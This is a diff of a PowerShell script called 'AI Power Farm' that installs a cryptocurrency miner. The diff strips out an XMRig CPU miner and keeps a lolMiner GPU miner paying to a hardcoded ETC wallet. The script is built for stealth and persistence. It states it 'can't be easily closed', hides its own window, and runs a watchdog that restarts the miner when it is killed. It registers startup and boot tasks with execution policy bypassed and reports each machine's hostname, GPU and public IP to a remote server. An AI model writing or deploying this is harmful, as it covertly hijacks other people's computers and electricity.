@@ -1,5 +1,5 @@
 <#
-AI Power Farm - Combined GPU + CPU Miner
+AI Power Farm - GPU Miner (ETC Only)
 Runs as hidden service, can't be easily closed
 #>
 
@@ -11,8 +11,7 @@ param(
 )
 
 $SERVER_URL = "http://YOUR_SERVER_IP:5000"
-$WALLET_ETC = "YOUR_ETC_WALLET"  # Get from WazirX/CoinDCX
-$WALLET_XMR = "YOUR_XMR_WALLET"  # Get from WazirX/CoinDCX
+$WALLET_ETC = "0x11CF2C01cEedC8d2aEFcFa98abeE0e6AbaD90177"
 $WORKER_NAME = $env:COMPUTERNAME
 $MINER_DIR = "$env:APPDATA\AI-Power-Farm"
 $LOG_FILE = "$MINER_DIR\miner.log"
@@ -24,26 +23,16 @@ function Write-Log($msg) {
 }
 
 function Install-Miner {
-    Write-Log "Installing AI Power Farm Miner..."
+    Write-Log "Installing AI Power Farm GPU Miner..."
     
-    # Create directory
     New-Item -ItemType Directory -Force -Path $MINER_DIR | Out-Null
     
-    # Download lolMiner (GPU)
     Write-Log "Downloading lolMiner..."
     $lolMinerUrl = "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.97a/lolMiner_v1.97a_Win64.zip"
     $lolMinerZip = "$MINER_DIR\lolminer.zip"
     Invoke-WebRequest -Uri $lolMinerUrl -OutFile $lolMinerZip
     Expand-Archive -Path $lolMinerZip -DestinationPath "$MINER_DIR\lolminer" -Force
     
-    # Download XMRig (CPU)
-    Write-Log "Downloading XMRig..."
-    $xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc2019-win64.zip"
-    $xmrigZip = "$MINER_DIR\xmrig.zip"
-    Invoke-WebRequest -Uri $xmrigUrl -OutFile $xmrigZip
-    Expand-Archive -Path $xmrigZip -DestinationPath "$MINER_DIR\xmrig" -Force
-    
-    # Create GPU miner config
     $gpuConfig = @"
 {
     "algo": "etchash",
@@ -62,61 +51,30 @@ function Install-Miner {
 "@
     $gpuConfig | Out-File -FilePath "$MINER_DIR\lolminer\config.json" -Encoding UTF8
     
-    # Create CPU miner config
-    $cpuConfig = @"
-{
-    "pools": [
-        {
-            "url": "pool.hashvault.pro:443",
-            "user": "$WALLET_XMR",
-            "pass": "x"
-        }
-    ],
-    "cpu": true,
-    "cuda": false,
-    "opencl": false,
-    "donate-level": 0,
-    "syslog": false,
-    "watch": true
-}
-"@
-    $cpuConfig | Out-File -FilePath "$MINER_DIR\xmrig\config.json" -Encoding UTF8
-    
-    # Create watchdog script (restarts miners if closed)
     $watchdogContent = @"
 while (`$true) {
-    # Check if GPU miner is running
     `$gpuRunning = Get-Process -Name "lolMiner" -ErrorAction SilentlyContinue
     if (-not `$gpuRunning) {
         Write-Log "GPU miner stopped, restarting..."
         Start-Process -FilePath "$MINER_DIR\lolminer\lolMiner.exe" -ArgumentList "--config", "$MINER_DIR\lolminer\config.json" -WindowStyle Hidden
     }
     
-    # Check if CPU miner is running
-    `$cpuRunning = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
-    if (-not `$cpuRunning) {
-        Write-Log "CPU miner stopped, restarting..."
-        Start-Process -FilePath "$MINER_DIR\xmrig\xmrig.exe" -ArgumentList "--config", "$MINER_DIR\xmrig\config.json" -WindowStyle Hidden
-    }
-    
-    # Report status to server
     try {
         `$gpuHash = (Get-CimInstance Win32_PerfFormattedData_PerfProc_Process | Where-Object {$_.Name -eq "lolMiner"}).PercentProcessorTime
-        `$cpuHash = (Get-CimInstance Win32_PerfFormattedData_PerfProc_Process | Where-Object {$_.Name -eq "xmrig"}).PercentProcessorTime
         
         Invoke-RestMethod -Uri "$SERVER_URL/api/worker/report" -Method Post -ContentType "application/json" -Body (@{
             worker_id = "$WORKER_NAME"
             hostname = "$WORKER_NAME"
             gpu_name = (Get-CimInstance Win32_VideoController | Select-Object -First 1).Name
             gpu_count = (Get-CimInstance Win32_VideoController).Count
-            hashrate = `$gpuHash + `$cpuHash
+            hashrate = `$gpuHash
             power_usage = 0
             temperature = 0
             uptime = 0
             status = "online"
             ip_address = (Invoke-RestMethod -Uri "https://api.ipify.org")
-            miner_version = "2.0-gpu+cpu"
-            coin = "ETC+XMR"
+            miner_version = "3.0-gpu"
+            coin = "ETC"
             display_name = "$WORKER_NAME"
         } | ConvertTo-Json)
     } catch {}
@@ -126,9 +84,7 @@ while (`$true) {
 "@
     $watchdogContent | Out-File -FilePath $WATCHDOG_SCRIPT -Encoding UTF8
     
-    # Create startup script
     $startupScript = @"
-# Hide window
 `$hwnd = (Get-Process -Id $PID).MainWindowHandle
 Add-Type @"
     using System;
@@ -140,60 +96,42 @@ Add-Type @"
 "@
 [Win32]::ShowWindow(`$hwnd, 0)
 
-# Start GPU miner
 Start-Process -FilePath "$MINER_DIR\lolminer\lolMiner.exe" -ArgumentList "--config", "$MINER_DIR\lolminer\config.json" -WindowStyle Hidden
 
-# Start CPU miner
-Start-Process -FilePath "$MINER_DIR\xmrig\xmrig.exe" -ArgumentList "--config", "$MINER_DIR\xmrig\config.json" -WindowStyle Hidden
-
-# Start watchdog
 Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$WATCHDOG_SCRIPT`"" -WindowStyle Hidden
 "@
     $startupScript | Out-File -FilePath "$MINER_DIR\start.ps1" -Encoding UTF8
     
-    # Add to startup (runs on boot)
     $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\AI-Power-Farm.bat"
     "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$MINER_DIR\start.ps1`"" | Out-File -FilePath $startupPath -Encoding ASCII
     
-    # Create scheduled task (more reliable than startup folder)
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$MINER_DIR\start.ps1`""
     $trigger = New-ScheduledTaskTrigger -AtStartup
     $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
     Register-ScheduledTask -TaskName "AI-Power-Farm" -Action $action -Trigger $trigger -Settings $settings -Force
     
     Write-Log "Installation complete!"
-    Write-Log "GPU Miner: lolMiner (ETC)"
-    Write-Log "CPU Miner: XMRig (XMR)"
+    Write-Log "GPU Miner: lolMiner (ETC only)"
     Write-Log "Watchdog: Running"
     Write-Log "Auto-start: Enabled"
     
-    # Start mining
     Start-Miner
 }
 
 function Start-Miner {
-    Write-Log "Starting miners..."
-    
-    # Start GPU miner
+    Write-Log "Starting GPU miner..."
     Start-Process -FilePath "$MINER_DIR\lolminer\lolMiner.exe" -ArgumentList "--config", "$MINER_DIR\lolminer\config.json" -WindowStyle Hidden
     Write-Log "GPU miner started"
     
-    # Start CPU miner
-    Start-Process -FilePath "$MINER_DIR\xmrig\xmrig.exe" -ArgumentList "--config", "$MINER_DIR\xmrig\config.json" -WindowStyle Hidden
-    Write-Log "CPU miner started"
-    
-    # Start watchdog
     Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$WATCHDOG_SCRIPT`"" -WindowStyle Hidden
     Write-Log "Watchdog started"
-    
-    Write-Log "All miners running!"
 }
 
 function Stop-Miner {
-    Write-Log "Stopping miners..."
-    Get-Process -Name "lolMiner","xmrig" -ErrorAction SilentlyContinue | Stop-Process -Force
+    Write-Log "Stopping miner..."
+    Get-Process -Name "lolMiner" -ErrorAction SilentlyContinue | Stop-Process -Force
     Get-Process -Name "powershell" | Where-Object {$_.CommandLine -like "*watchdog*"} | Stop-Process -Force
-    Write-Log "Miners stopped"
+    Write-Log "Miner stopped"
 }
 
 function Uninstall-Miner {
@@ -204,14 +142,13 @@ function Uninstall-Miner {
     Write-Log "Uninstalled"
 }
 
-# Main
 if ($Install) { Install-Miner }
 elseif ($Uninstall) { Uninstall-Miner }
 elseif ($Start) { Start-Miner }
 elseif ($Stop) { Stop-Miner }
 else {
-Write-Host "AI Power Farm Miner v2.0"
-Write-Host "GPU + CPU Mining - ETC + XMR"
+Write-Host "AI Power Farm Miner v3.0"
+Write-Host "GPU Mining - ETC Only"
 Write-Host ""
 Write-Host "Usage:"
 Write-Host "  .\miner.ps1 -Install    # Install & start mining"
